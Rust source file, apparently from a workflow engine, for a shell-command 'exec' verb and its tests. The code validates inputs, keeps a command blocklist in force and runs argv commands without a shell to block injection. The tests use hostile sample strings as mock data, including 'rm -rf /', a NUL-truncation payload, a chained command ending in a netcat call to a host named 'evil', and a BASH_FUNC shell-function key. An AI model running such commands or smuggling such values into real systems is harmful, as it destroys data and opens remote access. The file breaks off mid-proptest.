// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! # nika-verb-exec — the `exec` verb executor (L2)
//!
//! Shell command execution per `nika-spec spec/02-verbs.md §exec` — the
//! second of the 4 verbs (`infer · exec · invoke · agent` · locked forever
//! per D-2026-05-22-N18).
//!
//! ## Shape
//!
//! - **Two command forms, different security** — [`ExecCommand::Argv`]
//!   (`execve`, no shell · injection-safe · the default for any interpolated
//!   value) vs [`ExecCommand::Shell`] (`/bin/sh -c` · pipes · redirects ·
//!   blocklist-gated · genuine pipelines only). See [`ExecCommand`].
//! - **Effect injected, never owned** — the verb rides the kernel
//!   `ShellRunDyn` seam: production wiring hands it
//!   `nika-exec-runner::TokioShell` (s7 · blocklist + hard-kill timeout +
//!   concurrent drain), tests hand it `nika-kernel-mock::MockShell`.
//!   `pre_validated` is NEVER set — the runner's blocklist stays the floor.
//! - **The capture one-obvious-way split (spec §exec conformance)** —
//!   default modes (`stdout` · `stderr` · `combined`) FAIL the task on a
//!   non-zero exit (NIKA-440 / spec NIKA-EXEC-001); `capture: structured`
//!   returns `{ stdout, stderr, exit_code }` as DATA — the workflow
//!   branches on it, the task succeeds.
//!
//! ## Fences (what this crate is NOT)
//!
//! The blocklist (s7 runner floor + future `nika-policy`) · `${{ }}`
//! resolution (upstream binding) · retry/timeout POLICY (task-level —
//! the engine resolves them; the resolved timeout passes through) ·
//! output truncation (runner caps apply) · cancel-by-id (engine surface).
//!
//! ## Example (mock · zero subprocess)
//!
//! ```
//! use std::sync::Arc;
//! use nika_kernel_mock::MockShell;
//! use nika_verb_exec::{ExecInput, ExecVerb};
//!
//! # async fn demo() -> Result<(), Box<dyn std::error::Error>> {
//! let verb = ExecVerb::new(Arc::new(MockShell::new().enqueue_ok("hello\n")));
//! // argv form — injection-safe (no shell): each element is one literal token.
//! let out = verb.run(ExecInput::argv(["echo", "hello"])).await?;
//! # Ok(())
//! # }
//! ```

#![cfg_attr(test, allow(clippy::unwrap_used, clippy::expect_used, clippy::panic))]

mod errors;

use std::collections::BTreeMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use nika_kernel::process::{ShellCommand, ShellResult, ShellRunDyn};

pub use errors::VerbExecError;

/// The command to run — one of the two spec `command` forms (§exec).
///
/// The two forms have **different security properties**, and choosing the
/// right one is the single most important `exec` decision:
/// - [`Shell`](ExecCommand::Shell) runs the string through `/bin/sh -c` —
///   pipes, redirects, and globbing work, but the shell PARSES the whole
///   line, so any interpolated value is shell-parsed too (the injection
///   surface · the runner blocklist is a best-effort tripwire here).
/// - [`Argv`](ExecCommand::Argv) runs `command[0]` via `execve` with **no
///   shell**: every element is passed as ONE argv token verbatim. An
///   interpolated value can never break out of its argument — there is no
///   shell to parse it. **This is the structural fix for command injection**
///   (spec §exec) · the one-obvious-way for any value not authored inline.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum ExecCommand {
    /// String form → `/bin/sh -c <line>` (pipes · redirects · the shell
    /// blocklist applies). Use ONLY for genuine shell pipelines with no
    /// interpolated or untrusted value.
    Shell(String),
    /// Array form → `execve(command[0], command)` with NO shell. Each
    /// element is one argv token verbatim — injection-safe. The default
    /// choice for any command carrying a task output, a var, or any value
    /// not authored inline.
    Argv(Vec<String>),
}

/// The `exec` task input — spec fields, already CEL-resolved.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct ExecInput {
    /// The command to run (required · spec §exec · CEL-resolved upstream) ·
    /// a shell string XOR an argv vector ([`ExecCommand`]).
    pub command: ExecCommand,
    /// Working directory (default: engine cwd).
    pub cwd: Option<PathBuf>,
    /// OS environment for THIS subprocess (NOT the envelope `env:`) — the
    /// AUTHORED entries; the runner composes the child environment from the
    /// runner floor + [`Self::env_passthrough`] + this map (NEP-0005).
    pub env: BTreeMap<String, String>,
    /// The declared `permits.env:` passthrough names (NEP-0005) — resolved
    /// from the engine's ambient environment at the spawn site. Set by the
    /// engine from the step's permit, never authored.
    pub env_passthrough: Vec<String>,
    /// Stdin data.
    pub stdin: Option<String>,
    /// Output capture mode (default `Stdout`).
    pub capture: CaptureMode,
    /// Return the captured stream's RAW octets ([`ExecValue::Raw`])
    /// instead of lossy text — set by the engine when a `decode:`
    /// pipeline or a `returns:` contract needs the exact bytes (spec
    /// 09 §decode). Ignored under `capture: structured` (that value is
    /// already an object). Default `false` = today's text behavior.
    pub raw_capture: bool,
    /// Task-level timeout, resolved by the engine (03-dag) — the runner
    /// enforces the hard kill.
    pub timeout: Option<Duration>,
    /// The OS-confinement boundary derived from the workflow's declared
    /// `permits:` (ADR-095 Layer 6) — `Some` once a boundary exists, so
    /// the child is jailed to it at spawn; `None` = the unconfined
    /// blocklist-only floor (no `permits:` block). Set by the engine,
    /// never authored.
    pub sandbox: Option<nika_kernel::process::SandboxSpec>,
}

impl ExecInput {
    /// A shell-form run (`/bin/sh -c`) with every optional field unset.
    ///
    /// Convenience alias for [`ExecInput::shell`], kept for the common
    /// genuine-pipeline case. **Prefer [`ExecInput::argv`]** for any command
    /// carrying an interpolated or untrusted value (injection-safe).
    #[must_use]
    pub fn new(command: impl Into<String>) -> Self {
        Self::shell(command)
    }

    /// A shell-form run: the string goes through `/bin/sh -c` (pipes ·
    /// redirects · blocklist-gated). Use only for genuine shell pipelines.
    #[must_use]
    pub fn shell(command: impl Into<String>) -> Self {
        Self::with_command(ExecCommand::Shell(command.into()))
    }

    /// An argv-form run: `execve` with **no shell** · each element is one
    /// literal argv token. The injection-safe form — the one-obvious-way for
    /// any value not authored inline (spec §exec).
    #[must_use]
    pub fn argv<I, S>(argv: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        Self::with_command(ExecCommand::Argv(
            argv.into_iter().map(Into::into).collect(),
        ))
    }

    /// Construct from an explicit [`ExecCommand`] with optional fields unset.
    #[must_use]
    fn with_command(command: ExecCommand) -> Self {
        Self {
            command,
            cwd: None,
            env: BTreeMap::new(),
            env_passthrough: Vec::new(),
            stdin: None,
            capture: CaptureMode::Stdout,
            raw_capture: false,
            timeout: None,
            sandbox: None,
        }
    }
}

/// Output capture mode (spec `capture:` enum).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
#[non_exhaustive]
pub enum CaptureMode {
    /// Stdout only (default).
    #[default]
    Stdout,
    /// Stderr only.
    Stderr,
    /// Stdout then stderr, concatenated.
    Combined,
    /// `{ stdout, stderr, exit_code }` — non-zero exit is data, not failure.
    Structured,
}

/// The verb's result value per capture mode.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum ExecValue {
    /// Captured text (`stdout` · `stderr` · `combined` modes).
    Text(String),
    /// The captured stream's RAW octets — returned instead of `Text`
    /// when the caller set [`ExecInput::raw_capture`] (the `decode:`
    /// pipeline · spec 09 §decode · « raw bytes → decode → value,
    /// never bytes → lossy string → decode »). The decode itself is
    /// the caller's (the runtime owns the contract).
    Raw(Vec<u8>),
    /// The structured outcome (`structured` mode) — exit code included.
    Structured {
        /// Captured standard output.
        stdout: String,
        /// Captured standard error.
        stderr: String,
        /// Process exit code (the workflow's to branch on).
        exit_code: i32,
    },
}

/// The `exec` verb output.
#[derive(Debug)]
#[non_exhaustive]
pub struct ExecOutput {
    /// The shaped output value (`.output` in spec terms).
    pub output: ExecValue,
    /// Wall-clock duration of the subprocess.
    pub duration: Duration,
}

impl ExecOutput {
    /// Construct from the shaped value and the runner-reported duration.
    #[must_use]
    pub fn new(output: ExecValue, duration: Duration) -> Self {
        Self { output, duration }
    }
}

/// Shell command execution — the `exec` verb executor.
#[derive(Debug)]
pub struct ExecVerb<S> {
    shell: Arc<S>,
}

impl<S> ExecVerb<S> {
    /// Create the verb over an injected shell effect.
    #[must_use]
    pub fn new(shell: Arc<S>) -> Self {
        Self { shell }
    }
}

impl<S> ExecVerb<S>
where
    S: ShellRunDyn + Sync,
{
    /// Execute the `exec` task.
    ///
    /// CANCEL SAFETY: cancel-safe via the runner's `kill_on_drop`
    /// contract (INV-011) — dropping the future SIGKILLs the child.
    ///
    /// # Errors
    ///
    /// [`VerbExecError::InvalidParam`] on a blank command, an empty argv, a
    /// NUL byte in any command element / stdin, or a malformed env key ·
    /// [`VerbExecError::Shell`] when the runner fails (spawn · blocklist ·
    /// timeout) · [`VerbExecError::NonZeroExit`] on a non-zero exit in the
    /// default capture modes (`structured` returns it as data instead).
    pub async fn run(&self, input: ExecInput) -> Result<ExecOutput, VerbExecError> {
        validate_params(&input)?;
        let capture = input.capture;
        let raw_capture = input.raw_capture;

        let result = self
            .shell
            .run(build_command(input))
            .await
            .and_then(ShellResult::into_process_result)
            .map_err(|source| VerbExecError::Shell { source })?;

        // Typed adapter refusals were consumed above, before this capture
        // split. Only an actual business-process status can reach structured
        // interpretation.
        if capture != CaptureMode::Structured && result.status != 0 {
            return Err(VerbExecError::non_zero(result.status, &result.stderr));
        }

        let duration = result.duration;
        Ok(ExecOutput::new(
            shape_output(capture, raw_capture, result),
            duration,
        ))
    }
}

/// Verb-boundary validation BEFORE the runner call (NIKA-442).
///
/// The runner's blocklist (s7) is the security floor, but corruption
/// classes must be refused at the verb boundary because they would
/// silently change what the OS executes (review lens 3 · P1+P2):
/// - a **NUL byte** in any command element / `stdin` truncates the C-string
///   the OS receives, so a downstream check would see a different command
///   than the one that runs;
/// - an **empty argv** (or a blank `argv[0]`) has no program to execute;
/// - a **malformed env key** (`=`, NUL, or empty) corrupts the child's
///   `KEY=VALUE` environment assembly.
fn validate_params(input: &ExecInput) -> Result<(), VerbExecError> {
    match &input.command {
        ExecCommand::Shell(line) => {
            if line.trim().is_empty() {
                return Err(VerbExecError::InvalidParam {
                    param: "command",
                    detail: "command must be a non-empty string".to_owned(),
                });
            }
            if line.contains('\0') {
                return Err(VerbExecError::InvalidParam {
                    param: "command",
                    detail: "command must not contain a NUL byte".to_owned(),
                });
            }
        }
        ExecCommand::Argv(argv) => {
            let Some(program) = argv.first() else {
                return Err(VerbExecError::InvalidParam {
                    param: "command",
                    detail: "argv command must have at least one element (the program)".to_owned(),
                });
            };
            if program.trim().is_empty() {
                return Err(VerbExecError::InvalidParam {
                    param: "command",
                    detail: "argv[0] (the program) must be a non-empty string".to_owned(),
                });
            }
            for (index, element) in argv.iter().enumerate() {
                if element.contains('\0') {
                    return Err(VerbExecError::InvalidParam {
                        param: "command",
                        detail: format!("argv element {index} must not contain a NUL byte"),
                    });
                }
            }
        }
    }
    if input.stdin.as_deref().is_some_and(|s| s.contains('\0')) {
        return Err(VerbExecError::InvalidParam {
            param: "stdin",
            detail: "stdin must not contain a NUL byte".to_owned(),
        });
    }
    for (key, value) in &input.env {
        if !is_posix_env_name(key) {
            return Err(VerbExecError::InvalidParam {
                param: "env",
                detail: format!(
                    "env key {key:?} is not a valid name — must match [A-Za-z_][A-Za-z0-9_]* \
                     (empty, '=', NUL, and shell-function carriers like `BASH_FUNC_x%%` are refused)"
                ),
            });
        }
        // A NUL in the VALUE truncates the child's `KEY=VALUE` C-string just
        // like a key NUL — refuse it at the same boundary (review F2).
        if value.contains('\0') {
            return Err(VerbExecError::InvalidParam {
                param: "env",
                detail: format!("env value for {key:?} must not contain a NUL byte"),
            });
        }
    }
    Ok(())
}

/// A POSIX environment variable name: a leading letter or underscore, then
/// letters / digits / underscores. A strict narrowing of the prior "not
/// empty · no `=` · no NUL" check (all three still fail here), it additionally
/// refuses the exported-shell-function carrier — `BASH_FUNC_cp%%` and friends
/// are NOT valid names and would smuggle a bash function into an `sh -c` child
/// past the command scan (the payload never appears in the scanned command
/// string). Security defense-in-depth · the input floor before `nika-policy`.
fn is_posix_env_name(key: &str) -> bool {
    let mut chars = key.chars();
    matches!(chars.next(), Some(c) if c == '_' || c.is_ascii_alphabetic())
        && chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// Map the spec task surface onto the kernel `ShellCommand`.
///
/// [`ExecCommand::Shell`] sets `shell = true` (spec: « run via the OS
/// shell »); [`ExecCommand::Argv`] sets `shell = false` — `command[0]` is
/// the program, the rest are argv passed verbatim through `execve` (no
/// shell parse · the structural injection fix). `pre_validated` stays
/// `false` FOREVER — this crate never bypasses the runner blocklist. Takes
/// `input` by value so the (potentially large) env map and strings move
/// into the command instead of cloning (review lens 1 · P2-3).
fn build_command(input: ExecInput) -> ShellCommand {
    let mut cmd = match input.command {
        ExecCommand::Shell(line) => {
            let mut c = ShellCommand::new(line);
            c.shell = true;
            c
        }
        ExecCommand::Argv(argv) => {
            // command[0] = program, the rest = args · NO shell. `next` is
            // panic-free; an empty argv is already refused upstream by
            // `validate_params`, so the default `""` is never reached.
            let mut it = argv.into_iter();
            let program = it.next().unwrap_or_default();
            let mut c = ShellCommand::new(program);
            c.args = it.collect();
            c.shell = false;
            c
        }
    };
    cmd.cwd = input.cwd;
    cmd.env = input.env;
    cmd.env_passthrough = input.env_passthrough;
    cmd.stdin = input.stdin;
    cmd.timeout = input.timeout;
    // The OS-confinement boundary rides untouched to the runner, which
    // applies it AFTER the blocklist (the floor sees the REAL command).
    cmd.sandbox = input.sandbox;
    cmd
}

/// The capture one-obvious-way split (spec §exec conformance).
///
/// Total over `CaptureMode` — no panic arm: `structured` returns the exit
/// code as DATA; the default modes fail on a non-zero exit (review lens
/// 1+2 · P1 · the prior `unreachable!` is gone). Under `raw_capture` the
/// text modes return the stream's exact octets instead ([`ExecValue::Raw`]
/// · the `decode:` pipeline's input · spec 09 §decode); `structured` is
/// already an object and ignores the flag.
fn shape_output(capture: CaptureMode, raw_capture: bool, result: ShellResult) -> ExecValue {
    match capture {
        CaptureMode::Structured => ExecValue::Structured {
            stdout: result.stdout,
            stderr: result.stderr,
            exit_code: result.status,
        },
        CaptureMode::Stdout if raw_capture => ExecValue::Raw(
            result
                .stdout_raw
                .unwrap_or_else(|| result.stdout.into_bytes()),
        ),
        CaptureMode::Stderr if raw_capture => ExecValue::Raw(
            result
                .stderr_raw
                .unwrap_or_else(|| result.stderr.into_bytes()),
        ),
        CaptureMode::Combined if raw_capture => {
            let mut bytes = result
                .stdout_raw
                .unwrap_or_else(|| result.stdout.into_bytes());
            bytes.extend_from_slice(
                &result
                    .stderr_raw
                    .unwrap_or_else(|| result.stderr.into_bytes()),
            );
            ExecValue::Raw(bytes)
        }
        CaptureMode::Stdout => ExecValue::Text(result.stdout),
        CaptureMode::Stderr => ExecValue::Text(result.stderr),
        CaptureMode::Combined => ExecValue::Text(format!("{}{}", result.stdout, result.stderr)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use nika_kernel::process::ShellError;
    use nika_kernel_mock::MockShell;

    fn verb(mock: MockShell) -> ExecVerb<MockShell> {
        ExecVerb::new(Arc::new(mock))
    }

    #[tokio::test]
    async fn sandbox_spec_reaches_the_runner_untouched() {
        // ADR-095 Layer 6 — the engine-derived confinement boundary rides
        // from ExecInput to the runner verbatim (the runner applies it
        // AFTER the blocklist, so the floor sees the real command).
        let mock = MockShell::new().enqueue_ok("ok");
        let v = verb(mock.clone());
        let mut spec = nika_kernel::process::SandboxSpec::new();
        spec.fs_read = vec!["/repo/data/**".to_owned()];
        spec.net = nika_kernel::process::NetPolicy::Deny;
        let mut input = ExecInput::argv(["echo", "x"]);
        input.sandbox = Some(spec.clone());
        v.run(input).await.expect("runs");
        let sent = mock.executed_commands();
        assert_eq!(sent.len(), 1);
        assert_eq!(
            sent[0].sandbox.as_ref(),
            Some(&spec),
            "the sandbox spec rides verbatim"
        );
    }

    #[tokio::test]
    async fn stdout_capture_happy_path() {
        let mock = MockShell::new().enqueue_ok("built\n");
        let v = verb(mock.clone());
        let out = v
            .run(ExecInput::new("cargo build"))
            .await
            .expect("exit 0 succeeds");
        assert_eq!(out.output, ExecValue::Text("built\n".to_owned()));
        // The command reached the runner with the shell flag and WITHOUT
        // the blocklist bypass.
        let sent = mock.executed_commands();
        assert_eq!(sent.len(), 1);
        assert_eq!(sent[0].program, "cargo build");
        assert!(sent[0].shell, "spec: run via the OS shell");
        assert!(!sent[0].pre_validated, "blocklist floor stays armed");
    }

    #[tokio::test]
    async fn non_zero_exit_fails_default_modes() {
        let mock = MockShell::new().enqueue_fail(101, "compile error");
        let err = verb(mock)
            .run(ExecInput::new("cargo build"))
            .await
            .expect_err("non-zero fails stdout mode");
        match err {
            VerbExecError::NonZeroExit {
                status,
                stderr_tail,
            } => {
                assert_eq!(status, 101);
                assert_eq!(stderr_tail, "compile error");
            }
            other => panic!("expected NonZeroExit, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn structured_mode_returns_non_zero_as_data() {
        // THE load-bearing split: same failing command, structured capture —
        // the task SUCCEEDS and the workflow branches on exit_code.
        let mock = MockShell::new().enqueue_fail(1, "tests failed");
        let mut input = ExecInput::new("cargo test");
        input.capture = CaptureMode::Structured;
        let out = verb(mock).run(input).await.expect("structured succeeds");
        assert_eq!(
            out.output,
            ExecValue::Structured {
                stdout: String::new(),
                stderr: "tests failed".to_owned(),
                exit_code: 1,
            }
        );
    }

    #[tokio::test]
    async fn structured_mode_cannot_declassify_a_sandbox_refusal() {
        use nika_error::traits::NikaErrorCode as _;

        let mock = MockShell::new().enqueue_result(
            nika_kernel::process::ShellResult::new(
                126,
                r#"{"ok":true}"#,
                "sandbox launcher refused authority",
                Duration::from_millis(1),
            )
            .with_authority_refusal("sandbox launcher refused authority"),
        );
        let mut input = ExecInput::new("sandboxed-command");
        input.capture = CaptureMode::Structured;
        input.sandbox = Some(nika_kernel::process::SandboxSpec::new());
        let err = verb(mock.clone())
            .run(input)
            .await
            .expect_err("a sandbox refusal is authority failure, never structured success");
        assert_eq!(
            mock.executed_commands().len(),
            1,
            "the ShellResult was consumed"
        );
        assert_eq!(err.spec_code(), "NIKA-SEC-001");
        assert!(matches!(
            err,
            VerbExecError::Shell {
                source: nika_kernel::process::ShellError::Blocked { .. }
            }
        ));
    }

    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn production_seatbelt_refusal_precedes_structured_capture() {
        use std::os::unix::fs::PermissionsExt as _;

        use nika_error::traits::NikaErrorCode as _;
        use nika_exec_runner::TokioShell;
        use nika_sandbox_seatbelt::SeatbeltSandbox;

        assert!(SeatbeltSandbox::available(), "macOS must ship sandbox-exec");
        let dir = tempfile::tempdir().expect("fixture dir");
        let script = dir.path().join("refuse.sh");
        let denied = dir.path().join("denied.txt");
        std::fs::write(&denied, b"must stay outside the exact script grant")
            .expect("denied fixture");
        let quoted = denied.to_string_lossy().replace('\'', "'\\''");
        std::fs::write(
            &script,
            format!(
                "#!/bin/sh\nif /bin/cat '{quoted}' >/dev/null 2>&1; then exit 42; \
                 else /usr/bin/printf '{{\"ok\":true}}\\n'; exit 126; fi\n"
            ),
        )
        .expect("script");
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700))
            .expect("executable script");

        let shell = Arc::new(TokioShell::with_sandbox(Arc::new(SeatbeltSandbox::new())));
        let mut input = ExecInput::argv([script.to_string_lossy().into_owned()]);
        input.capture = CaptureMode::Structured;
        let mut spec = nika_kernel::process::SandboxSpec::new();
        spec.fs_read.push(script.to_string_lossy().into_owned());
        input.sandbox = Some(spec);
        let error = ExecVerb::new(shell)
            .run(input)
            .await
            .expect_err("Seatbelt authority cannot become structured data");

        assert_eq!(error.spec_code(), "NIKA-SEC-001");
        assert!(matches!(
            error,
            VerbExecError::Shell {
                source: nika_kernel::process::ShellError::Blocked { .. }
            }
        ));
    }

    #[tokio::test]
    async fn structured_mode_cannot_declassify_a_transport_failure() {
        use nika_error::traits::NikaErrorCode as _;

        let mock = MockShell::new().enqueue_result(
            nika_kernel::process::ShellResult::new(
                1,
                r#"{"ok":true}"#,
                "partial",
                Duration::from_millis(1),
            )
            .with_transport_failure("remote worker disconnected"),
        );
        let mut input = ExecInput::new("remote-command");
        input.capture = CaptureMode::Structured;
        let err = verb(mock.clone())
            .run(input)
            .await
            .expect_err("a transport failure is never structured success");
        assert_eq!(mock.executed_commands().len(), 1, "the result was consumed");
        assert_eq!(err.spec_code(), "NIKA-EXEC-002");
        assert!(matches!(
            err,
            VerbExecError::Shell {
                source: nika_kernel::process::ShellError::Other { .. }
            }
        ));
    }

    #[tokio::test]
    async fn stderr_and_combined_capture_shapes() {
        let both = || {
            MockShell::new().enqueue_result(nika_kernel::process::ShellResult::new(
                0,
                "out",
                "err",
                Duration::from_millis(3),
            ))
        };

        let mut input = ExecInput::new("c");
        input.capture = CaptureMode::Stderr;
        let out = verb(both()).run(input).await.expect("exit 0");
        assert_eq!(out.output, ExecValue::Text("err".to_owned()));

        let mut input = ExecInput::new("c");
        input.capture = CaptureMode::Combined;
        let out = verb(both()).run(input).await.expect("exit 0");
        assert_eq!(out.output, ExecValue::Text("outerr".to_owned()));
    }

    #[tokio::test]
    async fn shell_error_is_wrapped_not_swallowed() {
        let mock = MockShell::new().enqueue_err(ShellError::Blocked {
            reason: "rm -rf /".to_owned(),
        });
        let err = verb(mock)
            .run(ExecInput::new("rm -rf /"))
            .await
            .expect_err("blocked propagates");
        assert!(matches!(
            err,
            VerbExecError::Shell {
                source: ShellError::Blocked { .. }
            }
        ));
    }

    #[tokio::test]
    async fn empty_command_is_rejected_before_any_call() {
        let mock = MockShell::new();
        let recorder = mock.clone();
        let err = verb(mock)
            .run(ExecInput::new("   "))
            .await
            .expect_err("empty command rejected");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam {
                param: "command",
                ..
            }
        ));
        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
    }

    #[tokio::test]
    async fn env_cwd_stdin_timeout_land_on_the_command() {
        let mock = MockShell::new().enqueue_ok("");
        let recorder = mock.clone();
        let mut input = ExecInput::new("printenv");
        input.cwd = Some(PathBuf::from("/tmp"));
        input.env.insert("RUST_LOG".to_owned(), "debug".to_owned());
        input.stdin = Some("data".to_owned());
        input.timeout = Some(Duration::from_secs(60));
        verb(mock).run(input).await.expect("exit 0");
        let sent = recorder.executed_commands();
        assert_eq!(sent[0].cwd, Some(PathBuf::from("/tmp")));
        assert_eq!(
            sent[0].env.get("RUST_LOG").map(String::as_str),
            Some("debug")
        );
        assert_eq!(sent[0].stdin.as_deref(), Some("data"));
        assert_eq!(sent[0].timeout, Some(Duration::from_secs(60)));
    }

    /// Gate 10 PARITY — pins the behaviors the brouillon verb established
    /// (`git show brouillon:tools/nika-verb-exec/src/lib.rs` · read-only
    /// reference · CRAFT rewrite): delegate to the kernel shell trait,
    /// stdout is the default capture, the structured shape carries
    /// `stdout`/`stderr`/`exit_code`, and the runner-reported duration surfaces.
    #[tokio::test]
    async fn gate10_parity_delegation_vs_brouillon() {
        // Pin that run() reads result.duration verbatim (not a mock default):
        // a known, unusual duration must surface unchanged.
        let known = Duration::from_millis(4242);
        let mock = MockShell::new().enqueue_result(nika_kernel::process::ShellResult::new(
            0,
            "v0.80.0\n",
            "",
            known,
        ));
        let out = verb(mock)
            .run(ExecInput::new("nika --version"))
            .await
            .expect("delegates and succeeds");
        assert_eq!(out.output, ExecValue::Text("v0.80.0\n".to_owned()));
        assert_eq!(out.duration, known, "runner duration surfaces verbatim");
    }

    #[tokio::test]
    async fn nul_byte_in_command_is_rejected_before_any_call() {
        let mock = MockShell::new();
        let recorder = mock.clone();
        let err = verb(mock)
            .run(ExecInput::new("echo ok\0; rm -rf /"))
            .await
            .expect_err("NUL truncation refused");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam {
                param: "command",
                ..
            }
        ));
        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
    }

    #[tokio::test]
    async fn malformed_env_key_is_rejected() {
        // Prior floor (empty · `=` · NUL) PLUS the non-POSIX-name carriers:
        // `BASH_FUNC_cp%%` is the exported-shell-function injection vector, and
        // `.`/`-`/space/leading-digit are not valid env names.
        for bad in [
            "FOO=BAR",
            "",
            "NU\0L",
            "BASH_FUNC_cp%%",
            "FOO.BAR",
            "foo-bar",
            "1FOO",
            "FOO BAR",
        ] {
            let mock = MockShell::new();
            let recorder = mock.clone();
            let mut input = ExecInput::new("printenv");
            input.env.insert(bad.to_owned(), "v".to_owned());
            let err = verb(mock).run(input).await.unwrap_err();
            assert!(
                matches!(err, VerbExecError::InvalidParam { param: "env", .. }),
                "key {bad:?} rejected"
            );
            assert!(recorder.executed_commands().is_empty());
        }
    }

    #[tokio::test]
    async fn valid_posix_env_keys_pass_even_with_function_payload_value() {
        // The KEY charset is restricted, not the VALUE: a valid name carrying a
        // shell-function BODY as its value is fine (a plain env var, not an
        // exported function — the carrier lives in the KEY's `%%` suffix).
        for good in ["PATH", "MY_VAR", "_underscore", "A1", "LANG"] {
            let mock = MockShell::new().enqueue_ok("");
            let recorder = mock.clone();
            let mut input = ExecInput::new("printenv");
            input
                .env
                .insert(good.to_owned(), "() { echo pwned; }".to_owned());
            verb(mock)
                .run(input)
                .await
                .expect("valid POSIX key accepted");
            assert_eq!(recorder.executed_commands().len(), 1, "key {good:?} ran");
        }
    }

    #[tokio::test]
    async fn nul_byte_in_stdin_is_rejected() {
        let mock = MockShell::new();
        let mut input = ExecInput::new("cat");
        input.stdin = Some("data\0more".to_owned());
        let err = verb(mock).run(input).await.expect_err("NUL stdin refused");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam { param: "stdin", .. }
        ));
    }

    // ── Step 1: the array (argv) form — THE structural injection fix ──

    /// THE headline property: an argv element carrying shell metacharacters
    /// (`;`, `$(...)`, backticks, `|`) reaches the runner as ONE literal
    /// argv token with the shell flag OFF — there is no shell to parse it,
    /// so it can never break out of its argument into a second command.
    #[tokio::test]
    async fn argv_form_runs_without_shell_and_each_arg_is_literal() {
        let mock = MockShell::new().enqueue_ok("");
        let recorder = mock.clone();
        let payload = "; rm -rf / # $(whoami) `id` | nc evil 4444";
        verb(mock)
            .run(ExecInput::argv(["printf", "%s", payload]))
            .await
            .expect("argv form runs");
        let sent = recorder.executed_commands();
        assert_eq!(sent.len(), 1);
        assert!(
            !sent[0].shell,
            "argv form MUST NOT use the shell (no sh -c)"
        );
        assert!(!sent[0].pre_validated, "blocklist floor stays armed");
        assert_eq!(sent[0].program, "printf");
        assert_eq!(
            sent[0].args,
            vec!["%s".to_owned(), payload.to_owned()],
            "the metachar payload is ONE literal argv element — never split or parsed"
        );
    }

    /// The shell form keeps `/bin/sh -c` for genuine pipelines (the whole
    /// line is the program, the shell flag is ON).
    #[tokio::test]
    async fn shell_form_still_uses_the_shell() {
        let mock = MockShell::new().enqueue_ok("");
        let recorder = mock.clone();
        verb(mock)
            .run(ExecInput::shell("echo a | grep b"))
            .await
            .expect("shell form runs");
        let sent = recorder.executed_commands();
        assert!(sent[0].shell, "shell form keeps sh -c for pipelines");
        assert_eq!(sent[0].program, "echo a | grep b");
        assert!(sent[0].args.is_empty());
    }

    /// `new` is the shell form (back-compat convenience alias).
    #[tokio::test]
    async fn new_is_the_shell_form() {
        let mock = MockShell::new().enqueue_ok("");
        let recorder = mock.clone();
        verb(mock)
            .run(ExecInput::new("cargo build"))
            .await
            .expect("runs");
        assert!(recorder.executed_commands()[0].shell);
    }

    #[tokio::test]
    async fn empty_argv_is_rejected_before_any_call() {
        let mock = MockShell::new();
        let recorder = mock.clone();
        let err = verb(mock)
            .run(ExecInput::argv(Vec::<String>::new()))
            .await
            .expect_err("empty argv refused");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam {
                param: "command",
                ..
            }
        ));
        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
    }

    #[tokio::test]
    async fn blank_argv0_program_is_rejected() {
        let mock = MockShell::new();
        let recorder = mock.clone();
        let err = verb(mock)
            .run(ExecInput::argv(["   ", "arg"]))
            .await
            .expect_err("blank program refused");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam {
                param: "command",
                ..
            }
        ));
        assert!(recorder.executed_commands().is_empty());
    }

    #[tokio::test]
    async fn nul_byte_in_argv_element_is_rejected() {
        let mock = MockShell::new();
        let recorder = mock.clone();
        let err = verb(mock)
            .run(ExecInput::argv(["echo", "ok\0; rm -rf /"]))
            .await
            .expect_err("NUL in an argv element refused");
        assert!(matches!(
            err,
            VerbExecError::InvalidParam {
                param: "command",
                ..
            }
        ));
        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
    }
}

#[cfg(test)]
mod proptests {
    use std::sync::Arc;

    use nika_kernel_mock::MockShell;
    use proptest::prelude::*;

    use super::*;

    fn verb(mock: MockShell) -> ExecVerb<MockShell> {
        ExecVerb::new(Arc::new(mock))
    }

    proptest! {
        /// `shape_output` is total over `CaptureMode` and never panics:
        /// structured preserves the exit code verbatim, every other mode
        /// yields `Text`.
        #[test]
        fn shape_output_is_total(
            status in -255i32..=255,
            stdout in ".{0,80}",
            stderr in ".{0,80}",
        ) {
            let result = || nika_kernel::process::ShellResult::new(
                status, stdout.clone(), stderr.clone(), Duration::from_millis(1),
            );
            let structured_ok = matches!(
                shape_output(CaptureMode::Structured, false, result()),
                ExecValue::Structured { exit_code, .. } if exit_code == status
            );
            prop_assert!(structured_ok);
            for mode in [CaptureMode::Stdout, CaptureMode::Stderr, CaptureMode::Combined] {
                prop_assert!(matches!(shape_output(mode, false, result()), ExecValue::Text(_)));
                // raw_capture flips the text modes to the exact octets
                // (the decode pipeline's input) — never Text, never a panic.
                prop_assert!(matches!(shape_output(mode, true, result()), ExecValue::Raw(_)));
            }
            // structured ignores the flag — that value is already an object.
            let structured_ignores_flag = matches!(
                shape_output(CaptureMode::Structured, true, result()),
                ExecValue::Structured { .. }
            );
            prop_assert!(structured_ignores_flag);
        }

        /// The whole `run()` split: a non-zero exit fails the default modes
        /// and is data in `structured` — over arbitrary status codes.
        #[test]
        fn run_capture_split_over_status(status in -255i32..=255) {
